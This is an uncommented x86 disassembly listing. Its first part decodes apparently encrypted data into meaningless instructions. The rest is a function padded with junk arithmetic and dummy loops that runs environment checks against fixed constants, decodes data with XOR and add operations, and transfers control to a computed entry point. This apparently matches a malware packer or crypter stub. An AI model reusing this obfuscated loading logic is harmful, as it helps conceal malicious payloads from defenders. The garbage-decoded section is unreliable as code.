  40d609:	xor    BYTE PTR ds:0x3255b2cb,ch
  40d60f:	lahf   
  40d610:	push   esp
  40d611:	enter  0x4ea5,0x5b
  40d615:	in     eax,dx
  40d616:	sbb    bh,BYTE PTR [ebx+ebx*8-0x1e]
  40d61a:	xor    DWORD PTR [esi-0x67],0xc255c904
  40d621:	sub    bh,ch
  40d623:	or     ah,BYTE PTR [ebx-0x60]
  40d626:	cmp    ah,bl
  40d628:	std    
  40d629:	(bad)  
  40d62a:	fnstsw WORD PTR [ebp+ecx*4-0x80]
  40d62e:	rcl    DWORD PTR [ebx],1
  40d630:	dec    esp
  40d631:	mov    bh,0x6a
  40d633:	cmp    ch,BYTE PTR [ecx-0x34076c5]
  40d639:	loope  0x40d5bf
  40d63b:	jns    0x40d5d4
  40d63d:	iret   
  40d63e:	(bad)  
  40d640:	dec    edi
  40d641:	sbb    ebp,DWORD PTR [ecx]
  40d643:	iret   
  40d644:	(bad)  
  40d645:	nop
  40d646:	in     eax,0xbd
  40d648:	sbb    ch,BYTE PTR [edx]
  40d64a:	and    cl,BYTE PTR [ebx]
  40d64c:	lods   eax,DWORD PTR ds:[esi]
  40d64d:	in     eax,0x87
  40d64f:	sbb    ecx,ebp
  40d651:	xlat   BYTE PTR ds:[ebx]
  40d652:	stc    
  40d653:	xchg   ebx,eax
  40d654:	mov    eax,ds:0x78399838
  40d659:	jmp    0x40d675
  40d65b:	arpl   WORD PTR [ecx+eax*2+0x75],si
  40d65f:	fwait
  40d660:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d661:	jp     0x40d667
  40d663:	push   ebp
  40d664:	imul   ecx,DWORD PTR [ecx-0x5d],0xffffffcf
  40d668:	jnp    0x40d5fe
  40d66a:	dec    ebx
  40d66b:	jle    0x40d63b
  40d66d:	mov    ecx,0xa1dae388
  40d672:	xor    ebp,0xffffff88
  40d675:	lock or edi,DWORD PTR [edx-0x5f]
  40d679:	aad    0x1b
  40d67b:	dec    esp
  40d67c:	retf   0x2d7c
  40d67f:	nop
  40d680:	mov    al,0x1e
  40d682:	xchg   BYTE PTR [edx],al
  40d684:	jmp    0x4fe00a3c
  40d689:	nop
  40d68a:	or     eax,0x988c6fee
  40d68f:	sbb    al,0xec
  40d691:	pop    ss
  40d692:	outs   dx,DWORD PTR ds:[esi]
  40d693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d694:	js     0x40d6c9
  40d696:	push   0xe2720d77
  40d69b:	push   ds
  40d69c:	cmc    
  40d69d:	mov    al,0xd9
  40d69f:	ds clc 
  40d6a1:	in     al,0xf7
  40d6a3:	cdq    
  40d6a4:	inc    ebx
  40d6a5:	cmp    DWORD PTR [edi+0x5e3c2336],esi
  40d6ab:	lahf   
  40d6ac:	cwde   
  40d6ad:	shr    BYTE PTR [ebp+0x5803775a],cl
  40d6b3:	mov    ebx,0xd819d359
  40d6b8:	mov    cs,WORD PTR [ecx+ecx*8-0x69]
  40d6bc:	jl     0x40d65c
  40d6be:	jge    0x40d648
  40d6c0:	test   ch,dl
  40d6c2:	lock push ebp
  40d6c4:	push   ds
  40d6c5:	jmp    0x8972:0x583171d6
  40d6cc:	fyl2x  
  40d6ce:	xchg   BYTE PTR [edx+edx*1],ch
  40d6d1:	sbb    al,0xe6
  40d6d3:	xchg   ebx,eax
  40d6d4:	jecxz  0x40d659
  40d6d6:	test   BYTE PTR ds:0x41971e01,ch
  40d6dc:	lahf   
  40d6dd:	icebp  
  40d6de:	fisubr WORD PTR [ecx]
  40d6e0:	mov    bh,0xd1
  40d6e2:	ss call 0xa0713446
  40d6e8:	es out 0x17,al
  40d6eb:	hlt    
  40d6ec:	sbb    edx,DWORD PTR [eax-0x28]
  40d6ef:	inc    ecx
  40d6f0:	push   ecx
  40d6f1:	(bad)  
  40d6f2:	sub    ah,ch
  40d6f4:	cmp    eax,0x32f8501d
  40d6f9:	clc    
  40d6fa:	mov    bh,0x56
  40d6fc:	inc    esi
  40d6fd:	out    0x96,al
  40d6ff:	ja     0x40d693
  40d701:	outs   dx,DWORD PTR ds:[esi]
  40d702:	xor    ah,BYTE PTR [edi]
  40d704:	cld    
  40d705:	mov    esp,0x6f9ad98b
  40d70a:	push   0x76b66c6c
  40d70f:	mov    bh,0x42
  40d711:	sbb    ebx,eax
  40d713:	mov    cl,0x66
  40d715:	into   
  40d716:	xchg   edx,eax
  40d717:	aas    
  40d718:	(bad)  
  40d71b:	cmp    edi,DWORD PTR [esi]
  40d71d:	js     0x40d723
  40d71f:	dec    ebx
  40d720:	push   esp
  40d721:	cmp    dh,cl
  40d723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d724:	sbb    ch,ch
  40d726:	xchg   esp,eax
  40d727:	push   ss
  40d728:	dec    eax
  40d729:	push   es
  40d72a:	add    eax,0xe28822de
  40d72f:	jp     0x40d72f
  40d731:	jle    0x40d6ce
  40d733:	mov    dl,0x54
  40d735:	mov    ebp,0x6a2e3f43
  40d73a:	ret    0x105a
  40d73d:	sbb    al,0x74
  40d73f:	pop    ebp
  40d740:	sbb    al,0xc7
  40d742:	prefetchwt1 BYTE PTR [ecx-0x30f34127]
  40d749:	add    al,0x82
  40d74b:	xchg   esp,eax
  40d74c:	repz ss add ah,ch
  40d750:	fs in  eax,dx
  40d752:	ret    
  40d753:	dec    edx
  40d754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d755:	test   eax,0xf324a717
  40d75a:	jg     0x40d799
  40d75c:	sub    DWORD PTR [ebx+0x2b9347fe],0xffffffba
  40d763:	adc    al,BYTE PTR [eax]
  40d765:	jecxz  0x40d6e9
  40d767:	loopne 0x40d7ac
  40d769:	out    dx,eax
  40d76a:	cwde   
  40d76b:	aad    0x0
  40d76d:	bound  ebp,QWORD PTR [ecx-0x7c9d41c0]
  40d773:	jecxz  0x40d72c
  40d775:	jo     0x40d7ab
  40d777:	mov    ecx,0xf4bcb92e
  40d77c:	pop    es
  40d77d:	or     BYTE PTR [ecx],ah
  40d77f:	popa   
  40d780:	test   DWORD PTR [esi+0x2f],edx
  40d783:	sub    BYTE PTR [edi],dh
  40d785:	mov    ch,0x6f
  40d787:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d788:	or     BYTE PTR [ebp-0x4f],0x67
  40d78c:	call   DWORD PTR [esi+edi*8+0x1c]
  40d790:	scas   eax,DWORD PTR es:[edi]
  40d791:	mov    ebx,0xac983a5e
  40d796:	xchg   edx,eax
  40d797:	mov    al,ds:0x9f6ebccc
  40d79c:	xor    DWORD PTR [ecx-0x6e],esp
  40d79f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7a0:	loop   0x40d72b
  40d7a2:	mov    ch,0x9d
  40d7a4:	sub    bl,BYTE PTR [esi]
  40d7a6:	lea    esi,[edx+0x17780b52]
  40d7ac:	xchg   edi,eax
  40d7ad:	test   BYTE PTR [edi-0x48],ch
  40d7b0:	nop
  40d7b1:	jo     0x40d82b
  40d7b3:	mov    al,ds:0x30162389
  40d7b8:	ficomp WORD PTR [ecx-0x16e08654]
  40d7be:	scas   al,BYTE PTR es:[edi]
  40d7bf:	pop    esi
  40d7c0:	nop
  40d7c1:	enter  0x7d90,0x5d
  40d7c5:	stc    
  40d7c6:	adc    DWORD PTR [edi],ebp
  40d7c8:	ss xor eax,0x91339443
  40d7ce:	stos   DWORD PTR es:[edi],eax
  40d7cf:	fwait
  40d7d0:	jbe    0x40d84f
  40d7d2:	mov    al,ds:0x3feac431
  40d7d7:	jge    0x40d76c
  40d7d9:	rcl    DWORD PTR [ebx-0x1c],cl
  40d7dc:	enter  0x53db,0x9f
  40d7e0:	or     BYTE PTR [ebx],bl
  40d7e2:	xor    al,bl
  40d7e4:	sub    eax,0xc52a230
  40d7e9:	in     al,0x9a
  40d7eb:	sub    BYTE PTR [ecx+0x4ad18f10],ah
  40d7f1:	jle    0x40d783
  40d7f3:	call   0x5db023d
  40d7f8:	ins    DWORD PTR es:[edi],dx
  40d7f9:	cs int 0x1f
  40d7fc:	mov    bh,0x94
  40d7fe:	daa    
  40d7ff:	jp     0x40d86a
  40d801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d802:	aam    0x51
  40d804:	addr16 cmp eax,0xdd11f283
  40d80a:	mov    ecx,0x52fea97b
  40d80f:	jg     0x40d79e
  40d811:	inc    edi
  40d812:	pushf  
  40d813:	cmc    
  40d814:	inc    eax
  40d815:	or     ch,BYTE PTR [edx]
  40d817:	cmp    eax,0x7b94cb76
  40d81c:	push   edx
  40d81d:	adc    BYTE PTR [edx-0x64],0xd2
  40d821:	jae    0x40d827
  40d823:	pop    esi
  40d824:	mov    WORD PTR [edi-0x178909a7],?
  40d82a:	mov    ecx,0x4bba391
  40d82f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d830:	and    al,0x85
  40d832:	push   edi
  40d833:	div    DWORD PTR [ecx-0x56]
  40d836:	xor    ecx,DWORD PTR [esi-0x5e08daeb]
  40d83c:	popf   
  40d83d:	imul   ecx,edx,0x6
  40d840:	xchg   BYTE PTR [ebx],al
  40d842:	sub    eax,0x9d22cae3
  40d847:	and    al,0xeb
  40d849:	test   bl,0x4d
  40d84c:	sahf   
  40d84d:	mov    edx,0x12c7fd48
  40d852:	xchg   ebx,eax
  40d853:	nop
  40d854:	inc    ebx
  40d855:	mov    DWORD PTR [ebx-0xd],ebx
  40d858:	dec    eax
  40d859:	adc    ebp,DWORD PTR [edi]
  40d85b:	sub    cl,BYTE PTR [eax+0x6f61ff03]
  40d861:	mov    BYTE PTR [ecx-0x269b5b22],bl
  40d867:	push   0x24
  40d869:	ds call 0xdc5e:0x44b9a934
  40d871:	pop    esp
  40d872:	add    edi,DWORD PTR [ebp-0x10]
  40d875:	mov    edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fd69,0x42e19c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fdf6,0x42fd71
  40d8af:	call   DWORD PTR ds:0x42e517
  40d8b5:	and    DWORD PTR ds:0x42fd7d,0x42fe02
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e1b4,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e1a4,0x42fd69
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e58f
  40d8ee:	sbb    DWORD PTR ds:0x42e77b,0x42fdf2
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fd75,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e4d7
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fd85,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fdf6,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e1a4,0x42e777
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fdee,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fd6d,0x42e198
  40d977:	call   DWORD PTR ds:0x42e51f
  40d97d:	mov    DWORD PTR ds:0x42e19c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e40f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fd81,0x42e1b4
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fd6d,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e37b
  40d9be:	mov    DWORD PTR ds:0x42fe0a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e198,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fd75,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fd75
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fd75,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fd75,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e20d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e5cf
  40da20:	cmp    DWORD PTR ds:0x42fd75,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fd75
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fd75,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fd75,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e783,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e773,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fd51,0x42e19c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fd85,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fd85,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fd85,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e5d3
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fd85
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fd85,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e787,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e787,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e787,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e4e3
  40dae4:	cmp    DWORD PTR ds:0x42e787,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e787
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e787,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e787
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e787,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e77f,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e77f,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e77f,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e5d7
  40db41:	cmp    DWORD PTR ds:0x42e77f,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e77f
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e77f,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e77f
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e77f,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fdf6,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fdf6,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fdf6,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e5db
  40db97:	cmp    DWORD PTR ds:0x42fdf6,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fdf6
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fdf6,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fdf6
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fdf6,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e787,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e793,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fdfe,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fd65,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fd65
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fd65,edi
  40dc13:	cmp    DWORD PTR ds:0x42fd65,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fd65,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e4e7
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e1a8,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fd81,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fd89,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e777,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e777,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e777,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e4eb
  40dcaa:	cmp    DWORD PTR ds:0x42e777,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e777
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e777,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e777
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e777,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fe02,0x42e1ac
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fe02,0x42e1a4
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fd51,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e198,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fdf2,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fdf2
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fdf2,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fdf2,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fdf2,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e4ef
  40dd4f:	cmp    DWORD PTR ds:0x42fdf2,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fdf2
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fdf2,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fd8d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e1b0,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fd89,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fe06,0x42fd7d
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e773,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e77f,0x42fe0a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e76b
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fd65,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fd65
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fd65,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fd65,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fd89
  40de0d:	push   0x42e2ed
  40de12:	call   DWORD PTR ds:0x42e4f3
  40de18:	cmp    DWORD PTR ds:0x42fd65,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fda1
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fd7d,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fd75,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fd75,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fd75,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e5df
  40de65:	mov    edx,DWORD PTR ds:0x42fd75
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fd75,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
